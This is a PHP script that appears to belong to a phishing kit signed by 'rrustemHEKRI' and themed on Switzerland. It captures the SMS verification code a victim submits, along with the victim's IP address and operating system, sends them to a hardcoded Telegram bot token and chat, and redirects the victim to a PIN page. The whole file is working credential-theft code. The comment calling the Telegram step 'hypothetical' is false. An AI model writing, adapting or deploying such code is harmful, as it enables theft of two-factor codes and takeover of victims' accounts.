<?php
    include '../config.php';
    include "server.php";
    $os = getOS($_SERVER['HTTP_USER_AGENT']); 

    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
    🇨🇭 Switzerland rrustemHEKRI ----------------
    [IP]    : "."https://www.geodatatool.com/en/?ip=".$ip."
    [ SMS 1  ]      : ".$_POST['sms']."
    [OS] : ".$os."
    [👨‍💻 Coded] : "."By @rrustemHEKRI_V2"."
    -------- Switzerland rrustemHEKRI  \n";
       // Sending to a Telegram bot hypothetically
       $telegramBotToken = '6676319522:AAHx7QharxfLNSQ6HLQaPudpRyZMvgIGEzw';
       $chatId = '-4113876154';
        $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
       
       // Use file_get_contents or cURL to send the message
        $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini

    header("Location: ../pin.php");
?>